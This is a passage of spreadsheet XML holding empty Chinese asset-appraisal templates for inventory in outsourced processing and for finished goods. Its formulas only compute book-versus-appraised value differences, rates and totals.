        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="383" t="n"/>
      <c r="E21" s="383" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="383" t="n"/>
      <c r="E22" s="383" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="383" t="n"/>
      <c r="E23" s="383" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="383" t="n"/>
      <c r="E24" s="383" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="383" t="n"/>
      <c r="E25" s="383" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="383" t="n"/>
      <c r="E26" s="383" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>ROUND(SUM(K7:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="383" t="n"/>
      <c r="E27" s="383" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="383" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>ROUND(K26-K27,2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="14">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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 codeName="Sheet31">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="14.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="13.5" customWidth="1" style="582" min="6" max="6"/>
    <col width="6.83333333333333" customWidth="1" style="582" min="7" max="7"/>
    <col width="13.1666666666667" customWidth="1" style="582" min="8" max="8"/>
    <col outlineLevel="1" width="7.83333333333333" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="8.5" customWidth="1" style="582" min="10" max="10"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="582" min="11" max="11"/>
    <col outlineLevel="1" width="10" customWidth="1" style="582" min="12" max="12"/>
    <col outlineLevel="1" width="7" customWidth="1" style="582" min="13" max="13"/>
    <col width="8.16666666666667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存货—委托加工物资评估明细表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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表3-9-4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583" t="n"/>
      <c r="G4" s="583" t="n"/>
      <c r="H4" s="583" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="583" t="n"/>
      <c r="K4" s="583" t="n"/>
      <c r="L4" s="583" t="n"/>
      <c r="M4" s="583" t="n"/>
      <c r="N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名称及规格型号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>加工单位名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="584" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="584" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="565" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="584" t="inlineStr">
        <is>
          <t>评估单价</t>
        </is>
      </c>
      <c r="K6" s="584" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="383" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="383" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="383" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="383" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="383" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="383" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="383" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="383" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="383" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="383" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="383" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="383" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="383" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="383" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="383" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="383" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="383" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="383" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N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0" t="n"/>
      <c r="E26" s="383" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>ROUND(SUM(K7:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="383" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>ROUND(K26-K27,2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="15">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="M3:N3"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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2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 codeName="Sheet32">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="21.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="8.33333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="9.5" customWidth="1" style="410" min="7" max="7"/>
    <col width="12" customWidth="1" style="317" min="8" max="8"/>
    <col outlineLevel="1" width="10.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="9.33333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col hidden="1" outlineLevel="1" width="6.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="10.5" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="10.1666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="7.16666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col width="9" customWidth="1" style="410" min="16" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>存货—产成品（库存商品、开发产品、农产品）评估明细表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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="291" t="inlineStr">
        <is>
          <t>表3-9-5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18" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="291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名  称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="E5" s="177" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="593" t="n"/>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O5" s="185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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="185" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="595" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="185" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>汇率</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
